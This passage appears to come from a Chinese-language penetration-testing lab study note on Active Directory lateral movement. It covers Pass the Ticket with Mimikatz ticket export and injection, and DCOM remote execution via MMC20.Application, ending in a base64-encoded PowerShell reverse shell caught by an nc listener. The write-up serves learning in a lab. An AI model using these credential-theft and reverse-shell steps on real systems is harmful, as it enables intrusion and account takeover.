`Ticket #1`: TGS（Ticket Granting Service），用於存取 FILES04 的 CIFS（檔案共享服務）。

#### 4. 使用 Kerberos ticket 存取目標機器
使用 [PsExec](#PsExec) 來執行遠端命令，因為它依賴 Kerberos 來驗證
```
PS C:\Windows\system32> cd C:\tools\SysinternalsSuite\
PS C:\tools\SysinternalsSuite> .\PsExec.exe \\files04 cmd

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
corp\jen

C:\Windows\system32>hostname
FILES04
```

>[!Important]
>**Overpass the Hash（PtK） VS Pass the Hash（PtH）**\
>![image](https://hackmd.io/_uploads/B1yFXxg3ye.png)

### Pass the Ticket
Pass the Ticket（PtT） 利用已獲取的 Kerberos service ticket（TGS）存取受保護資源，與 Overpass the Hash（PtK） 最大的不同：
- PtK 透過 NTLM Hash 來請求新的 Kerberos TGT，然後存取服務
- PtT 直接使用已存在的 TGS，無需進行 NTLM 認證或請求新的 TGT

PtT 可以繞過 NTLM，但只限使用 Kerberos 驗證來存取目標資源

>[!Note]
>Pass the Ticket 滿足條件：
>- 目標使用者（如 dave）已經在系統上登入，並且產生了 Kerberos service ticket（TGS）。
>- 擁有 SYSTEM 權限，能夠存取 LSASS 來提取 ticket（例如透過 Mimikatz）。
>- 可以將提取的 TGS 重新注入到自己的 session 中，從而模擬目標使用者。

[範例環境]\

使用 `jen` 嘗試存取 WEB04 伺服器，將濫用 dave 的現有 session。dave 有權存取位於 WEB04 上的備份資料夾，而我們的登入使用者jen沒有。
#### 1. 確認目前使用者無法存取受限資源
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /cert-ignore /u:jen  /p:Nexus123! /v:192.168.170.74
```
```
PS C:\Users\jen\Desktop> whoami
corp\jen
PS C:\Users\jen\Desktop> ls \\web04\backup
ls : Access is denied
At line:1 char:1
+ ls \\web04\backup
...
```
> 表示 jen 沒有權限存取 backup 共享資料夾

#### 2. 提取當前記憶體中的 Kerberos ticket
使用 Mimikatz 來匯出系統記憶體中所有的 Kerberos TGT/TGS:
```
PS C:\Windows\system32> cd C:\Tools\
PS C:\Tools> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::tickets /export

Authentication Id : 0 ; 9257415 (00000000:008d41c7)
Session           : Interactive from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 3/13/2025 12:01:41 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 3/13/2025 12:01:41 AM ; 3/13/2025 10:01:41 AM ; 3/20/2025 12:01:41 AM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; corp ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM ( corp )
           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             c69b596b7721c388ce399eb8361c41de4a529e56b582288c9b7987862a430ee7
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;8d41c7]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi !
```
>已成功匯出記憶體中 [LSASS](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)  process 空間中的 TGT/TGS，匯出成 `.kirbi` 檔案

利用 `dir *.kirbi` 檢查匯出的 TGT 與 TGS
```
PS C:\Tools> dir *.kirbi

    Directory: C:\Tools

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/12/2025  11:50 PM           1567 [0;2be743]-0-0-40a10000-jen@cifs-web04.kirbi
...
-a----         3/13/2025  12:17 AM           1563 [0;3e7]-2-1-40e10000-CLIENT74$@krbtgt-CORP.COM.kirbi
-a----         3/13/2025  12:17 AM           1521 [0;8d41c7]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
-a----         3/13/2025  12:17 AM           1577 [0;8d4217]-0-0-40810000-dave@cifs-web04.kirbi
-a----         3/13/2025  12:17 AM           1611 [0;8d4217]-0-1-40850000-dave@LDAP-DC1.corp.com.kirbi
-a----         3/13/2025  12:17 AM           1521 [0;8d4217]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
```

#### 3. 在 session 中注入 ticket
選擇 `dave@cifs-web04.kirbi` 格式的任何 TGS 票證，並透過`kerberos::ptt` 指令將其註入 mimikatz 

>[!Tip]
>dave 相關的 `*.kirbi` 有：\
>`[0;8d41c7]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi`\
`[0;8d4217]-0-0-40810000-dave@cifs-web04.kirbi`\
`[0;8d4217]-0-1-40850000-dave@LDAP-DC1.corp.com.kirbi`\
>>為什麼選擇 `[0;8d4217]-0-0-40810000-dave@cifs-web04.kirbi` ?而不是其他 kirbi ticket?\
>>Ans: 現在要利用 TGS 存取 CIFS
>>- dave@krbtgt-CORP.COM.kirbi（TGT）
>>❌ 這是 TGT，只能用來請求 TGS，不能直接存取 WEB04。
>>❌ 如果要使用 TGT，還需要額外請求 TGS，這可能會被 SIEM 監控到。
>>- dave@LDAP-DC1.corp.com.kirbi（TGS）
❌ 這個 TGS 票證適用於 LDAP 服務，而不是 CIFS 檔案共享。
❌ 即使注入這個票證，也無法存取 WEB04。

將 dave 在 WEB04 的 TGS ticket 注入到 jen 的 session
```
mimikatz # kerberos::ptt [0;8d4217]-0-0-40810000-dave@cifs-web04.kirbi

* File: '[0;8d4217]-0-0-40810000-dave@cifs-web04.kirbi': OK
```

#### 4. 驗證票證是否成功注入
`klist` 檢查當前 session 中的 Kerberos ticket
```
PS C:\Tools> klist

Current LogonId is 0:0x2be743

Cached Tickets: (1)

#0>     Client: dave @ CORP.COM
        Server: cifs/web04 @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40810000 -> forwardable renewable name_canonicalize
        Start Time: 3/13/2025 0:02:47 (local)
        End Time:   3/13/2025 10:01:41 (local)
        Renew Time: 3/20/2025 0:01:41 (local)
        Session Key Type: Kerberos DES-CBC-CRC
        Cache Flags: 0
        Kdc Called:
```

#### 5. 嘗試存取目標
```
PS C:\Tools> ls \\web04\backup

    Directory: \\web04\backup

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/13/2022   2:52 AM              0 backup_schemata.txt
-a----         3/12/2025  10:58 PM             78 flag.txt
```
> 成功偽裝成 dave，並存取 WEB04\backup 共享資料夾

>[!Important]
>**Pass the Hash（PtH vs.Pass the Ticket（PtT） vs. Overpass the Hash（PtK)**\
>![image](https://hackmd.io/_uploads/rkPhfMe2Je.png)

### DCOM
>[!Note]
>**COM 與 DCOM**
>- COM（[Component Object Model](https://msdn.microsoft.com/en-us/library/windows/desktop/ms680573(v=vs.85).aspx)）: 是
>Microsoft 開發的一種技術，用於讓應用程式內部的不同元件互相溝通，最早用於 同一台機器上的應用程式交互。
>- DCOM（[Distributed Component Object Model](https://msdn.microsoft.com/en-us/library/cc226801.aspx)）:
> COM 的延伸，允許不同電腦透過網路進行 COM 物件的交互，這讓應用程式可以透過 RPC（遠端程序呼叫） 在多台機器間運行。

DCOM 透過 RPC（TCP 135）進行通訊，需要本機管理員權限才能存取 DCOM Service Control Manager (SCM)，本質上是一個 API

DCOM 橫向移動是基於用於 Windows 系統腳本自動化的 [Microsoft Management Console](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/microsoft-management-console-start-page)(MMC) COM 應用程式。\
MMC 應用程式類別允許建立  [Application Objects](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/application-object?redirectedfrom=MSDN)，該對象公開 Document.ActiveView 屬性下的 ExecuteShellCommand method。這是 local administrators 的預設設定，允許經過身份驗證的使用者在獲得授權後執行任何 shell 命令，。

>[!Important]
利用 MMC20.Application.1 這個 COM Object 來遠端執行命令：\
透過 ExecuteShellCommand 可執行 cmd.exe 或 PowerShell 指令。

[情境範例]
- 目前已經掌控 CLIENT74（Windows 11），並以 jen 身份登入。
- 目標機器是 FILES04（IP: 192.168.170.73）。
- 目標機器上啟用了 DCOM，且 jen 具有管理員權限。

#### 1. 透過 PowerShell 遠端建立 DCOM Object
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /cert-ignore /u:jen  /p:Nexus123! /v:192.168.170.74
```
在 CLIENT74 上開啟 Administrator 的 PowerShell，建立了一個遠端的 MMC 2.0 Application Object
```
PS C:\Windows\system32> $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.170.73"))
```
> `"MMC20.Application.1"`: MMC 應用的 ProgID\
`"192.168.50.73"`: 目標機器 FILES04 的 IP
#### 2. 透過 DCOM 遠端執行 cmd.exe
```
PS C:\Windows\system32> $dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```
> `"cmd"`：執行 cmd.exe\
`/c calc`：指示 cmd.exe 執行 calc\
`"7"`：控制視窗狀態，7 代表最小化執行\
>>FILES04 會在 Session 0 啟動 calc.exe，但因為是服務模式，無法直接在桌面上看到

可在 FILES04 上檢查是否成功
```
C:\Users\Administrator>tasklist | findstr "calc"
win32calc.exe                 4764 Services                   0     12,132 K
```
#### 3. 使用 DCOM 執行 Reverse Shell
產生 Base64 編碼的 PowerShell Reverse Shell payload
```
┌──(chw㉿CHW)-[~/Tools]
└─$ python3 WMI_reverseshell.py
powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOAA1ACIALAA4ADgAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==

```
DCOM 執行
```
PS C:\Windows\system32> $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOAA1ACIALAA4ADgAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==","7")
```
(Kali)
```
┌──(chw㉿CHW)-[~/Tools]
└─$ nc -nvlp 8888                      
listening on [any] 8888 ...
connect to [192.168.45.185] from (UNKNOWN) [192.168.170.73] 65097

PS C:\Windows\system32> whoami
corp\jen
PS C:\Windows\system32> hostname
FILES04

PS C:\Windows\system32> 

```
## Active Directory Persistence
### Overpass the Hash
